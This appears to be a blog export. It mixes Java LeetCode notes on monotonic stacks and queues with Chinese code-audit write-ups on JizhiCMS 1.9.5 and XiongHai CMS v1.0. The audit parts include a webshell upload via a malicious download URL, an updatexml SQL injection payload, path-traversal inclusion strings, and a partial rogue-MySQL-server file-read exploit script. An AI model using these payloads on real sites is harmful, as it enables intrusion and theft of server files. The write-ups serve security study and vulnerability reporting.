     // 偶数个元素往右列表插入            right.addFirst(val);        &#125; else &#123;            left.addLast(val);        &#125;        balance();    &#125;        public void pushBack(int val) &#123;        right.addLast(val);        balance();    &#125;        public int popFront() &#123;        if (size() == 0) &#123;            return -1;        &#125;        int e;        // 只有一个元素时，只会在右列表里        if (size() == 1) &#123;             e = right.removeLast();        &#125; else &#123;            e =  left.removeFirst();        &#125;        balance();        return e;    &#125;        public int popMiddle() &#123;        if (size() == 0) &#123;            return -1;        &#125;        int e;        if (size() % 2 == 0) &#123;            // 偶数个元素从左列表移除            e = left.removeLast();        &#125; else &#123;            e = right.removeFirst();        &#125;        balance();        return e;    &#125;        public int popBack() &#123;        if (size() == 0) &#123;            return -1;        &#125;        int e = right.removeLast();        balance();        return e;    &#125;       private int size() &#123;        return left.size() + right.size();    &#125;&#125;\n\n\n\n单调栈 ‼️\n  特性：每次新元素入栈后，栈内的元素都保持有序\n\n  将其想象成比较身高大小，其第一个看见的露出头的元素即为符合要求的元素，因为后面的都被挡住了，结合栈结构，就是从后往前依次比较。由于栈 FILO 特性，每次得到的一定是最近的比它高的元素\n  int[] nextGreaterElement(int[] nums) &#123;    int n = nums.length;    // 存放答案的数组    int[] res = new int[n];    Stack&lt;Integer&gt; s = new Stack&lt;&gt;();     // 倒着往栈里放    for (int i = n - 1; i &gt;= 0; i--) &#123;        // 判定个子高矮        while (!s.isEmpty() &amp;&amp; s.peek() &lt;= nums[i]) &#123;            // 矮个起开，反正也被挡着了。。。            s.pop();        &#125;        // nums[i] 身后的更大元素        res[i] = s.isEmpty() ? -1 : s.peek();        s.push(nums[i]);    &#125;    return res;&#125;\n\nleetcode-496 下一个更大元素 I\n  这道题由于 nums1 是 nums2 的子集，因此只需要先求出 nums2 元素的下一个更大元素结果，然后再由 nums1 去查找即可\n  public int[] nextGreaterElement(int[] nums1, int[] nums2) &#123;        int n = nums2.length;        HashMap&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;();        Stack&lt;Integer&gt; stack = new Stack&lt;&gt;();        for (int i = n - 1; i &gt;= 0; i--) &#123;            while (!stack.isEmpty() &amp;&amp; stack.peek() &lt;= nums2[i]) &#123;                stack.pop();            &#125;            int res = stack.isEmpty() ? -1 : stack.peek();            map.put(nums2[i], res);            stack.push(nums2[i]);        &#125;        int[] res = new int[nums1.length];        for (int i = 0; i &lt; nums1.length; i++) &#123;            res[i] = map.get(nums1[i]);        &#125;        return res;    &#125;\n\nleetcode-739 每日温度\n  这题思路没转过来，单调栈里只要保存索引值即可\n  public int[] dailyTemperatures(int[] temperatures) &#123;        Stack&lt;Integer&gt; stack = new Stack&lt;&gt;();        int[] res = new int[temperatures.length];        for (int i = temperatures.length - 1; i &gt;= 0; i--) &#123;            while (!stack.isEmpty() &amp;&amp; temperatures[stack.peek()] &lt;= temperatures[i]) &#123;                stack.pop();            &#125;            res[i] = stack.isEmpty() ? 0 : stack.peek() - i;            stack.push(i);        &#125;        return res;    &#125;\n\n环形数组的解决\n  环形数组的特点在于其最后一个元素会紧接着第一个元素，解决这个问题实际是需要将数组长度翻倍即可\n  public int[] nextGreaterElements(int[] nums) &#123;        int n = nums.length;        Stack&lt;Integer&gt; stack = new Stack&lt;&gt;();                int[] res = new int[n];        // 模拟翻倍，取模运算即可        for (int i = 2 * n - 1; i &gt;= 0; i--) &#123;            while (!stack.isEmpty() &amp;&amp; stack.peek() &lt;= nums[i % n]) &#123;                stack.pop();            &#125;                         res[i % n] = stack.isEmpty() ? -1 : stack.peek();            stack.push(nums[i % n]);        &#125;        return res;    &#125;\n\n\n\n单调栈变体 ‼️\n\n下一个更大或相等的元素\n 把上面这段代码中 while 循环的 &lt;= 号改成 &lt; 号即可\n\n下一个更小元素\n while 循环的 &lt;= 条件改成 &gt;= 条件即可\n\n下一个更小或相等元素\n while 循环的 &gt;= 条件改成 &gt; 即可\n\n上一个更大元素\n 从头至尾开始往栈里放元素即可，栈顶元素就是 nums[i] 之前的元素\n\n上一个更大或相等的元素\n 同1\n\n上一个更小的元素\n 同2\n\n上一个更小或相等的元素\n 同3\n\n\n\nleetcode-1019 链表中的下一个更大节点\n  只需要将链表先转换为数组即可\n  public int[] nextLargerNodes(ListNode head) &#123;        ArrayList&lt;Integer&gt; arr = new ArrayList&lt;&gt;();        for (ListNode p = head; p != null; p = p.next) &#123;            arr.add(p.val);        &#125;        int n = arr.size();        int[] res = new int[n];        Stack&lt;Integer&gt; stack = new Stack&lt;&gt;();        for (int i = n - 1; i &gt;= 0; i--) &#123;            while (!stack.isEmpty() &amp;&amp; stack.peek() &lt;= arr.get(i))             &#123;                stack.pop();            &#125;            res[i] = stack.isEmpty() ? 0 : stack.peek();            stack.push(arr.get(i));        &#125;        return res;    &#125;\n\nleetcode-1944 队列中可以看到的人数 hard\n  这道题可以转为为求下一个更大或等于元素问题，只不过在统计的时候记录小于该元素身高的个数；另外一直困惑对于这种身高确实低于它的元素但是由于左边有比他高的所以不算是怎么解决的，应该是单调栈的特性，其中会保持单调递增特性（对于求下一更大元素而言），因此这个元素在之前计算时早就被弹栈出去了\n\n  public int[] canSeePersonsCount(int[] heights) &#123;        int n = heights.length;        // &#123;身高，小于等于该身高人数&#125;        int[] res = new int[n];        Stack&lt;Integer&gt; stack = new Stack&lt;&gt;();        for (int i = n - 1; i &gt;= 0; i--) &#123;            int count = 0;            while (!stack.isEmpty() &amp;&amp; stack.peek() &lt; heights[i]) &#123;                stack.pop();                count++;                // 栈中元素单调递增 栈顶 -&gt; 栈底            &#125;            res[i] = stack.isEmpty() ? count : count + 1;            stack.push(heights[i]);        &#125;        return res;    &#125;\n\nleetcode-1475 商品折扣后的最终价格\n  经典单调栈下一个更小或相等元素问题\n  public int[] finalPrices(int[] prices) &#123;        int n = prices.length;        int[] res = new int[n];        Stack&lt;Integer&gt; stack = new Stack&lt;&gt;();        for (int i = n - 1; i &gt;= 0; i--) &#123;            while (!stack.isEmpty() &amp;&amp; stack.peek() &gt; prices[i]) &#123;                stack.pop();            &#125;            res[i] = stack.isEmpty() ? -1 : stack.peek();            stack.push(prices[i]);        &#125;        for (int i = 0; i &lt; n; i++) &#123;            if (res[i] != -1) &#123;                res[i] = prices[i] - res[i];            &#125; else &#123;                 res[i] = prices[i];            &#125;        &#125;        return res;    &#125;\n\nleetcode-901 股票价格跨度\n  这道题转换一下思路，股票价格小于或等于今天价格的最大连续日数即向前看更大元素问题。但是这里注意要保留弹栈元素对应的大于价格天数的记录，这个源于单调栈的单调特性（这里是单调递减）\n\n比如已经入栈的价格序列是 [40, 30, 20, 10]，那么如果执行 next(25)，价格序列变成 [40, 30, 25]，20 和 10 都会被「挤掉」，算上 25 本身，函数返回 2 + 1 = 3。\n但还有个问题，这个 3 应该作为「权重」和 25 一同存储在栈中。因为之后 25 还可能被挤掉，比如说执行 next(26)，价格序列就变成了 [40, 30, 26]，但这种情况下之前的 20 和 10 显然也应该被挤掉，函数应该返回 3 + 1 = 4\n\n  class StockSpanner &#123;    private Stack&lt;int[]&gt; stack;    public StockSpanner() &#123;        stack = new Stack&lt;&gt;();    &#125;        public int next(int price) &#123;        // 算上当天        int count = 1;        while (!stack.isEmpty() &amp;&amp; stack.peek()[0] &lt;= price) &#123;            // 保留每个价格的权值，即已经大于或等于的价格累计天数            count += stack.pop()[1];        &#125;        stack.push(new int[]&#123;price, count&#125;);        return count;    &#125;&#125;\n\nleetcode-402 移掉 K 位数字\n  这题需要保证修改后的数字最小，需要经过两步操作：\n\nk &gt; 0 的情况下移除元素使得字符串中数字升序排布，可转化为向前看更大元素问题，保证单调栈中元素为升序\nk &gt; 0 的情况下移除字符串尾部元素，因为尾部元素最大\npublic String removeKdigits(String num, int k) &#123;        Stack&lt;Character&gt; stack = new Stack&lt;&gt;();        for (char c : num.toCharArray()) &#123;            // 保证单调栈是单增的            while (!stack.isEmpty() &amp;&amp; stack.peek() &gt; c &amp;&amp; k &gt; 0) &#123;                stack.pop();                k--;            &#125;            // 字符串不以 0 开头            if (stack.isEmpty() &amp;&amp; c == &#x27;0&#x27;) &#123;                continue;            &#125;            stack.push(c);        &#125;            // 弹掉末尾的元素        while (k &gt; 0 &amp;&amp; !stack.isEmpty()) &#123;            stack.pop();            k--;        &#125;        if (stack.isEmpty()) &#123;            return &quot;0&quot;;        &#125;         StringBuilder sb = new StringBuilder();        while (!stack.isEmpty()) &#123;            sb.append(stack.pop());        &#125;        // 出栈是以逆序字符串形式        return sb.reverse().toString();    &#125;\n\n\n\n\n\n单调队列\n  即满足队列中的元素都是单调递增（递减）的。\n\n与优先级队列的区别\n  优先级队列无法满足标准队列结构「先进先出」的时间顺序，因为优先级队列底层利用二叉堆对元素进行动态排序，元素的出队顺序是元素的大小顺序，和入队的先后顺序完全没有关系；而优先级队列维护队列元素「先进先出」的时间顺序，又能够正确维护队列中所有元素的最值\n\n与滑动窗口双指针的区别\n  滑动窗口双指针无法单凭移出窗口的那个元素更新窗口的最值\n\n\n\n\n**应用：**\n\n- [leetcode-239 滑动窗口最大值](https://leetcode.cn/problems/sliding-window-maximum/) **hard**\n\n    首先队列需要在队尾插入元素，队头移除元素，因此底层可以采用 LinkedList 数据结构；\n\n    对于队尾插入时，我们需要保证类似单调栈一样的单减特性，如果队尾元素比待插入的元素小就出队（或者从队尾到队头看是递增的）；\n\n    ![Untitled](%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%E7%AF%87%2048420399d0014e07ac9760f1e579f6d8/Untitled%205.png)\n\n    对于队头元素来说就是最大的，在出队时，还需要判断一下这个窗口最左边的元素是不是和单调队列的队头是同一个元素，如果不是就直接忽略（因为早就被移出去了）\n\n    ![Untitled](%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%E7%AF%87%2048420399d0014e07ac9760f1e579f6d8/Untitled%206.png)\n\n    class Solution &#123;    class MonotonicQueue  &#123;        private LinkedList&lt;Integer&gt; link;        public MonotonicQueue() &#123;            link = new LinkedList&lt;&gt;();        &#125;        public void enqueue(int val) &#123;            while (!link.isEmpty() &amp;&amp; link.getLast() &lt; val) &#123;                link.pollLast();            &#125;            link.addLast(val);        &#125;        public void dequeue(int val) &#123;            if (link.getFirst() == val) &#123;                link.removeFirst();            &#125;        &#125;        public int getMax() &#123;            return link.getFirst();        &#125;    &#125;    public int[] maxSlidingWindow(int[] nums, int k) &#123;        ArrayList&lt;Integer&gt; tmp = new ArrayList&lt;&gt;();        MonotonicQueue window = new MonotonicQueue();        for (int i = 0; i &lt; nums.length; i++) &#123;            if (i &lt; k - 1) &#123;                window.enqueue(nums[i]);            &#125; else &#123;                // 满足了窗口大小为 k                window.enqueue(nums[i]);                tmp.add(window.getMax());                // 下一次移动窗口前先出队                window.dequeue(nums[i - k + 1]);            &#125;        &#125;        int[] res = new int[tmp.size()];        for (int i = 0; i &lt; res.length; i++) &#123;            res[i] = tmp.get(i);        &#125;                return res;    &#125;&#125;\n\n- 通用模板\n\n    其中两个链表分别维护最大元素和最小元素；还有一个链表用来维护队列的大小和时间顺序\n\n    /* 单调队列的实现，可以高效维护最大值和最小值 */class MonotonicQueue&lt;E extends Comparable&lt;E&gt;&gt; &#123;    // 常规队列，存储所有元素    LinkedList&lt;E&gt; q = new LinkedList&lt;&gt;();    // 元素降序排列的单调队列，头部是最大值    LinkedList&lt;E&gt; maxq = new LinkedList&lt;&gt;();    // 元素升序排列的单调队列，头部是最小值    LinkedList&lt;E&gt; minq = new LinkedList&lt;&gt;();    public void push(E elem) &#123;        // 维护常规队列，直接在队尾插入元素        q.addLast(elem);        // 维护 maxq，将小于 elem 的元素全部删除        while (!maxq.isEmpty() &amp;&amp; maxq.getLast().compareTo(elem) &lt; 0) &#123;            maxq.pollLast();        &#125;        maxq.addLast(elem);        // 维护 minq，将大于 elem 的元素全部删除        while (!minq.isEmpty() &amp;&amp; minq.getLast().compareTo(elem) &gt; 0) &#123;            minq.pollLast();        &#125;        minq.addLast(elem);    &#125;    public E max() &#123;        // maxq 的头部是最大元素        return maxq.getFirst();    &#125;    public E min() &#123;        // minq 的头部是最大元素        return minq.getFirst();    &#125;    public E pop() &#123;        // 从标准队列头部弹出需要删除的元素        E deleteVal = q.pollFirst();        assert deleteVal != null;        // 由于 push 的时候会删除元素，deleteVal 可能已经被删掉了        if (deleteVal.equals(maxq.getFirst())) &#123;            maxq.pollFirst();        &#125;        if (deleteVal.equals(minq.getFirst())) &#123;            minq.pollFirst();        &#125;        return deleteVal;    &#125;    public int size() &#123;        // 标准队列的大小即是当前队列的大小        return q.size();    &#125;    public boolean isEmpty() &#123;        return q.isEmpty();    &#125;&#125;\n\n\n**经典例题：**\n\n- [leetcode-1438 绝对差不超过限制的最长连续子数组](https://leetcode.cn/problems/longest-continuous-subarray-with-absolute-diff-less-than-or-equal-to-limit/)\n\n    这道题就是单调队列 + 滑动窗口的结合：\n\n    1. 当窗口中元素极差小于等于 limit 时扩大窗口\n    2. 当窗口中元素极差大于 limit 时缩小窗口\n    3. 操作之后更新窗口大小作为最长子数组\n\n    class Solution &#123;    public int longestSubarray(int[] nums, int limit) &#123;        int left = 0, right = 0;        MonotonicQueue window = new MonotonicQueue();        int res = 1;        while (right &lt; nums.length) &#123;            window.push(nums[right]);            right++;            while (window.getMax() - window.getMin() &gt; limit) &#123;                window.pop(nums[left]);                left++;            &#125;                        res = Math.max(res, window.size());        &#125;        return res;    &#125;    class MonotonicQueue &#123;       LinkedList&lt;Integer&gt; q = new LinkedList&lt;&gt;();       LinkedList&lt;Integer&gt; maxq = new LinkedList&lt;&gt;();        LinkedList&lt;Integer&gt; minq = new LinkedList&lt;&gt;();       public void push(int val) &#123;           q.addLast(val);           while (!maxq.isEmpty() &amp;&amp; maxq.getLast() &lt; val) &#123;               maxq.pollLast();           &#125;           maxq.addLast(val);           while (!minq.isEmpty() &amp;&amp; minq.getLast() &gt; val) &#123;               minq.pollLast();           &#125;            minq.addLast(val);       &#125;       public void pop(int dele) &#123;           q.pollFirst();           if (dele == maxq.getFirst()) &#123;               maxq.pollFirst();           &#125;           if (dele == minq.getFirst()) &#123;               minq.pollFirst();           &#125;       &#125;       public int getMax() &#123;           return maxq.getFirst();       &#125;       public int getMin() &#123;           return minq.getFirst();       &#125;       public int size() &#123;           return q.size();       &#125;       public boolean isEmpty() &#123;           return q.isEmpty();       &#125;    &#125;&#125;\n\n- [leetcode-862 和至少为 K 的最短子数组](https://leetcode.cn/problems/shortest-subarray-with-sum-at-least-k/) **hard**\n\n    [leetcode-209 长度最小的子数组](https://leetcode.cn/problems/minimum-size-subarray-sum/)\n\n    这道题需要结合 前缀和、滑动窗口和单调队列的思路。利用前缀和可以求得子数组和（大于 k 时滑动窗口满足缩小条件），滑动窗口辅助定位什么时候前缀和**减去最小元素值**仍然是 ≥ k 的，即为满足条件的情况\n\n    class Solution &#123;    public int shortestSubarray(int[] nums, int k) &#123;        int n = nums.length;        // 前缀和        long[] preSum = new long[n + 1];        preSum[0] = 0;        for (int i = 1; i &lt;= n; i++) &#123;            preSum[i] = preSum[i-1] + nums[i-1];        &#125;        MonotonicQueue window = new MonotonicQueue();        int left = 0, right = 0;        int len = Integer.MAX_VALUE;        while (right &lt; preSum.length) &#123;            window.push(preSum[right]);            right++;            // 这里最后一轮 right 会越界            while (right &lt; preSum.length &amp;&amp; !window.isEmpty() &amp;&amp; preSum[right] - window.getMin() &gt;= k) &#123;                len = Math.min(len, right - left);                window.pop();                left++;            &#125;        &#125;        return len == Integer.MAX_VALUE ? -1 : len;    &#125;    class MonotonicQueue &#123;        LinkedList&lt;Long&gt; q = new LinkedList&lt;&gt;();        LinkedList&lt;Long&gt; maxq = new LinkedList&lt;&gt;();        LinkedList&lt;Long&gt; minq = new LinkedList&lt;&gt;();        public void push(long val) &#123;            q.addLast(val);            while (!maxq.isEmpty() &amp;&amp; maxq.getLast() &lt; val) &#123;                maxq.pollLast();            &#125;            maxq.addLast(val);            while (!minq.isEmpty() &amp;&amp; minq.getLast() &gt; val) &#123;                minq.pollLast();            &#125;            minq.addLast(val);        &#125;        public void pop() &#123;            long del = q.pollFirst();            if (del == maxq.getFirst()) &#123;                maxq.pollFirst();            &#125;            if (del == minq.getFirst()) &#123;                minq.pollFirst();            &#125;        &#125;        public long getMin() &#123;            return minq.getFirst();        &#125;        public long getMax() &#123;            return maxq.getFirst();        &#125;        public int size() &#123;            return q.size();        &#125;        public boolean isEmpty() &#123;            return q.isEmpty();        &#125;    &#125;&#125;\n\n- [leetcode-918 环形子数组的最大和](https://leetcode.cn/problems/maximum-sum-circular-subarray/)\n\n    这道题考察的是环形数组的子数组和，我们仍然可以沿用之前的思路，将环形数组展开成线性的 2 倍长度。但是题目给了限制子数组长度不能超过 nums.length，因此还需要借助滑动窗口来控制窗口大小，在每次入队时更新子数组和最大值。\n\n    class Solution &#123;    public int maxSubarraySumCircular(int[] nums) &#123;        int n = nums.length;        long[] preSum = new long[2 * n + 1];        preSum[0] = 0;        for (int i = 1; i &lt; preSum.length; i++) &#123;            preSum[i] = preSum[i-1] + nums[(i - 1 + n) % n];        &#125;        MonotonicQueue window = new MonotonicQueue();        // 第一个前缀和        window.push(0);        long len = Integer.MIN_VALUE;        for (int i = 1; i &lt; preSum.length; i++) &#123;\t\t\t\t\t\t\t// 减的时候尽量不要减太多，也就是减最小值            len = Math.max(len, preSum[i] - window.getMin());            if (window.size() == nums.length) &#123;                window.pop();            &#125;            window.push(preSum[i]);        &#125;        return (int) len;    &#125;    class MonotonicQueue &#123;        LinkedList&lt;Long&gt; q = new LinkedList&lt;&gt;();        LinkedList&lt;Long&gt; maxq = new LinkedList&lt;&gt;();        LinkedList&lt;Long&gt; minq = new LinkedList&lt;&gt;();        public void push(long val) &#123;            q.addLast(val);            while (!maxq.isEmpty() &amp;&amp; maxq.getLast() &lt; val) &#123;                maxq.pollLast();            &#125;            maxq.addLast(val);            while (!minq.isEmpty() &amp;&amp; minq.getLast() &gt; val) &#123;                minq.pollLast();            &#125;            minq.addLast(val);        &#125;        public void pop() &#123;            long del = q.pollFirst();            if (del == maxq.getFirst()) &#123;                maxq.pollFirst();            &#125;            if (del == minq.getFirst()) &#123;                minq.pollFirst();            &#125;        &#125;        public long getMin() &#123;            return minq.getFirst();        &#125;        public long getMax() &#123;            return maxq.getFirst();        &#125;        public int size() &#123;            return q.size();        &#125;        public boolean isEmpty() &#123;            return q.isEmpty();        &#125;    &#125;&#125;\n\n- **TODO:** 需要用到动态规划\n\n    [leetcode-1696 跳跃游戏 VI](https://leetcode.cn/problems/jump-game-vi/)\n\n    [leetcode-53 最大子数组和](https://leetcode.cn/problems/maximum-subarray/)\n\n    [leetcode-1425 带限制的子序列和](https://leetcode.cn/problems/constrained-subsequence-sum/)\n\n- [leetcode-1429 第一个唯一数字](https://leetcode.cn/problems/first-unique-number/)\n\n    这题主要考察 哈希表和队列的配合使用，我们通过哈希表来记录数组中元素出现的次数，队列来保持元素的先后顺序。在查找唯一元素时，对于队列中不唯一的元素，因为始终不满足题意，因此直接删去即可。\n\n    class FirstUnique &#123;    private HashMap&lt;Integer, Integer&gt; count = new HashMap&lt;&gt;();    private LinkedList&lt;Integer&gt; q = new LinkedList&lt;&gt;();    public FirstUnique(int[] nums) &#123;        for (int num : nums) &#123;            add(num);        &#125;    &#125;        public int showFirstUnique() &#123;        while (!q.isEmpty()) &#123;            int v = q.peek();            if (count.get(v) &gt; 1) &#123;                q.poll();            &#125; else &#123;                return v;            &#125;        &#125;        return -1;    &#125;        public void add(int value) &#123;        q.offer(value);        int v = count.getOrDefault(value, 0);        count.put(value, v + 1);    &#125;&#125;\n","tags":["基础"]},{"title":"跟着Y4师傅学代码审计-极致CMS_V1.9.5","url":"/2022/12/12/%E6%9E%81%E8%87%B4CMS1.9.5%E5%88%86%E6%9E%90/","content":"写在前面这是正式审计分析的第5篇，前面其实自己分析了几个。提交了CNVD，用的是之前学习的思路，感觉还不错！求求给归档一个！这篇分析极致CMS1.9.5\n框架分析因为这套代码底层框架采用的是FrPHP，因此有必要先学习一下FrPHP框架的基本知识\n\n框架目录结构\n\nFr.php -&gt; FrPHP框架核心加载文件\n\nFr.php\n首先会有一个spl_autoload_register()函数\n\n\n\n首先需要了解什么是__autoload()函数，这个我们之前其实见过，起作用就是省去了require带来的麻烦，当需要用到类时会自动装载\n\n相比于__autoload()，spl_autoload_register()允许注册多个装载函数用于加载指定类，也就是说，指定类在调用时并不会同__autoload()一样自动触发，而是在spl_autoload_register注册的函数中去找对应的处理代码\n\n再来看看Fr.php中注册的装载函数loadClass()是怎么处理未定义类的\npublic function loadClass($className)    &#123;        $classMap = $this-&gt;classMap();        if (isset($classMap[$className])) &#123;            // 包含内核文件            $file = $classMap[$className];        &#125; elseif (strpos($className, &#x27;\\\\&#x27;) !== false) &#123;            // 包含应用（application目录）文件            $file = APP_PATH . str_replace(&#x27;\\\\&#x27;, &#x27;/&#x27;, $className) . &#x27;.php&#x27;;            if (!is_file($file)) &#123;                return;            &#125;        &#125; else &#123;            return;        &#125;        include $file;        // 这里可以加入判断，如果名为$className的类、接口或者性状不存在，则在调试模式下抛出错误    &#125;\n这里首先会通过classMap()方法获取到所有的内核文件类名，可以看到均为键值对的形式，之后便是根据对应的文件名进行包含\n\n回到启动方法run()，接下来调用setDbConfig()，这里就是根据数据库配置文件定义一些常量便于后续使用\n\n之后调用setReporting()，这里也就是根据APP_DEBUG（调试模式）来指定错误输出级别\n\n接着调用removeMagicQuotes()方法，这里实际上就是对用户的输入数据会有自动检测敏感字符，调用stripSlashesDeep()\n\n也就是对元素调用一个stripslashes()方法，其会自动去除转义反斜线后的字符串（\\&#39; 转换为 &#39; 等等）。双反斜线（\\\\）被转换为单个反斜线（\\）\n\n\ncommon目录 -&gt; Error.php\n这里有个过滤，不过只过滤了php标签？\n\n\ncommon目录 -&gt; Functions.php\n这里首先如果name为空的话就会返回Model类实例，否侧就会返回指定参数的Model实例\nfunction M($name=null) &#123;\tif(empty($name))&#123;\t\t$path = &#x27;FrPHP\\lib\\\\Model&#x27;;\t\treturn $path::getInstance();\t&#125;    $name = ucfirst($name);\tif($name==&#x27;&#x27;)&#123;\t\treturn &#x27;缺少模型类！&#x27;;\t&#125;else&#123;\t\t$table = $name;\t\t$name = APP_HOME.&#x27;\\\\&#x27;.HOME_MODEL.&#x27;\\\\&#x27;.$name.&#x27;Model&#x27;;\t\tif(!class_exists($name))&#123;\t\t\t$path = &#x27;FrPHP\\lib\\\\Model&#x27;;\t\t\treturn $path::getInstance($table);\t\t&#125;else&#123;\t\t\treturn $name::getInstance($table);\t\t&#125;\t\t\t&#125;&#125;\n后面提供了很多工具方法和过滤方法\n\ndb -&gt; DBholder.php\n这里就是封装了数据库对象，需要同数据库进行交互时即可获取该实例并调用它所封装好的CRUD方法。非常典型的单例模式\n\n\nExtend -&gt; compressimage.php\n见名知义，是个处理图像压缩的类\n这里openImage()方法会获取src变量作为输入，调用getimagesize方法获取图片的大小相关信息\n\n\nlib -&gt; Controller.php\nfrparam方法处理前端传过来的参数\npublic function frparam($str=null, $int=0,$default = FALSE, $method = null)&#123;\t\t\t\t$data = $this-&gt;_data;\t\tif($str===null) return $data;\t\tif(!array_key_exists($str,$data))&#123;\t\t\treturn ($default===FALSE)?false:$default;\t\t&#125;\t\t\t\tif($method===null)&#123;\t\t\t$value = $data[$str];\t\t&#125;else&#123;\t\t\t$method = strtolower($method);\t\t\tswitch($method)&#123;\t\t\t\tcase &#x27;get&#x27;:\t\t\t\t$value = $_GET[$str];\t\t\t\tbreak;\t\t\t\tcase &#x27;post&#x27;:\t\t\t\t$value = $_POST[$str];\t\t\t\tbreak;\t\t\t\tcase &#x27;cookie&#x27;:\t\t\t\t$value = $_COOKIE[$str];\t\t\t\tbreak;\t\t\t\t\t\t\t&#125; \t\t&#125;\t\treturn format_param($value,$int,$default);\t\t\t\t&#125;\n这里会根据method和str动态获取不同传参方式中的参数值，最后会调用一个format_param方法进行参数过滤，跟进可以看到对不同的参数类型都做了严格的过滤\n\n\nView.php\n其中存在多种标签解析处理方法。这里首先是fun标签的解析，可以看到这里只是对标签中的内容作了简单的替换，也没有做任何过滤操作\n\n再来看看文件包含的标签，这里调用了template_html_include方法\n\n跟入可以看到对后缀作了限制。如果是没有后缀的文件是读不了的因为会补一个html\n\n\n\n漏洞分析文件上传漏洞\n位于后台扩展管理中插件列表功能，我们随便点一个下载项，抓包\n\n数据包中可以看到下载链接是可控的，是否可以造成任意文件下载呢\n\n我们分析一下对应的代码，根据路由admin.php/Plugins/update.html定位至PluginsController#update()\n首先根据前面的分析，这里会对输入参数进行一个过滤。具体代码是\n$value = SafeFilter($value);\t\t$value=htmlspecialchars(trim($value), ENT_QUOTES);\t\tif(version_compare(PHP_VERSION,&#x27;7.4&#x27;,&#x27;&gt;=&#x27;))&#123;\t\t\t$value = addslashes($value);\t\t&#125;else&#123;\t\t\tif(!get_magic_quotes_gpc())$value = addslashes($value);\t\t&#125;\t\t\t\treturn $value;\n这里可以看到对输入参数download_url并没有作来源处理，只是简单的拼接了一个版本在后头\n\n之后进入switch分支，根据action值决定跳转分支\n这里会先创建一个临时文件，然后将下载文件的内容写入\n\n最终会通过JSON回显路径JsonReturn([&#39;code&#39;=&gt;0,&#39;tmp_path&#39;=&gt;$tmp_path])\n我们尝试修改download_url为vps恶意下载链接\n\n之后一直放包，后面还会有解压文件操作\n\n我们跟进对应的action查看，里面判断压缩文件存在的话，就会调用get_zip_originalsize()方法\n\n之后就是遍历压缩文件中的内容逐个解压，并写到$path.zip_entry_name($dir_resource)对应的文件名处。path变量对应APP_PATH.&#39;A/exts/&#39;\n\n最后访问/A/exts/shell.php验证上传成功\n\nSQL注入漏洞\n漏洞点在刚才插件页面的配置功能处\n\n对应路由/admin.php/Plugins/setconf/id/1.html\n对应到setconf()方法，可以看到id参数用的正常过滤函数frparam()，下面的setconfigdata方法却直接POST传参\n\n跟进可以看到里面有一个update数据库操作，这里参数id比较好操纵\n\n这里继续调用update方法，之前已经看到数据库交互这部分sql语句是拼接起来的，会造成sql注入\n\n利用 报错注入\nid=1&#x27; and updatexml(1, concat(0x7e, version()),1)#\n\n\n不过好像错误日志不回显，那就盲注，这里就不往下展开利用过程了\n参考链接https://y4tacker.blog.csdn.net/article/details/116740125\nhttps://y4tacker.blog.csdn.net/article/details/116643890\nhttps://y4tacker.blog.csdn.net/article/details/117264018\n","tags":["代码审计"]},{"title":"跟着Y4师傅学代码审计-熊海CMS_V1.0","url":"/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/","content":"写在前面准备开始冲一下CNVD了，开启白盒审计阶段。这一篇练习分析熊海CMSV1.0，补充自己的一些trick和审计思路，加油！\n这里会边适应申整套源码的思路，边同时扩展里面出现的知识点\n配置环境https://down.chinaz.com/search/%E7%86%8A%E6%B5%B7CMS.htm 站长之家下载源码。\n这里选用phpstudy搭建CMS运行环境\nphp: 5.2.17apache:mysql: 5.5.53windows: Windows 11 家庭中文版\n代码审计先拿自动化工具扫一下\n\n好家伙331个，这误报率有点高\n我们一个个来\nLFI在根目录index.php中直接就存在一个文件包含，我们可以通过目录穿越包含根目录的文件(这里需要配合写文件或者文件上传一类)\n\n例如我们在根目录写一个shell.php，其中包含phpinfo()\nr=../shell\n当然这里后缀有限制，我们特殊条件下也可以采用00截断，但现在不常见了就不展开了\n\n php 版本小于 5.3.4 而且GPC = Off 允许使用%00 \n\nadmin目录下同样也存在一个，原理一致不再多说\nINSTALL安装逻辑问题在/install/index.php中，判断网站是否已安装取决于当前目录是否存在InstallLock.txt文件，所以如果我们是利用前面所述的文件包含漏洞，在根目录包含install/index.php文件就会导致重装问题\n\nr=../install/index\n\n这里Y4是否提到了一个配合目录穿越读文件的利用\n首先如果是在根目录去包含install文件的话是会出错的，因为其中会包含一个../inc/db.class.php文件。该文件如果在根目录包含是一定出错的。因此，我们需要找到一个保持相对路径相同包含点文件来利用\n\n/admin/index.php便是比较好利用的，这里看到当前文件与/install/index.php针对/inc/conn.php的相对路径是一样的，因此可以包含到正确文件\nr=../../install/index\n\n进一步我们这里便可以利用恶意mysql服务端来读取任意文件\nhttps://www.mi1k7ea.com/2021/04/23/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/\nexp: 注意版本适配\n&lt;?phpfunction unhex($str) &#123; return pack(&quot;H*&quot;, preg_replace(&#x27;#[^a-f0-9]+#si&#x27;, &#x27;&#x27;, $str)); &#125;$filename = &quot;/etc/passwd&quot;;$srv = stream_socket_server(&quot;tcp://0.0.0.0:1237&quot;);while (true) &#123;  echo &quot;Enter filename to get [$filename] &gt; &quot;;  $newFilename = rtrim(fgets(STDIN), &quot;\\r\\n&quot;);  if (!empty($newFilename)) &#123;    $filename = $newFilename;  &#125;  echo &quot;[.] Waiting for connection on 0.0.0.0:1237\\n&quot;;  $s = stream_socket_accept($srv, -1, $peer);  echo &quot;[+] Connection from $peer - greet... &quot;;  fwrite($s, unhex(&#x27;45 00 00 00 0a 35 2e 31  2e 36 33 2d 30 75 62 75                    6e 74 75 30 2e 31 30 2e  30 34 2e 31 00 26 00 00                    00 7a 42 7a 60 51 56 3b  64 00 ff f7 08 02 00 00                    00 00 00 00 00 00 00 00  00 00 00 00 64 4c 2f 44                    47 77 43 2a 43 56 63 72  00                     &#x27;));  fread($s, 8192);  echo &quot;auth ok... &quot;;  fwrite($s, unhex(&#x27;07 00 00 02 00 00 00 02  00 00 00&#x27;));  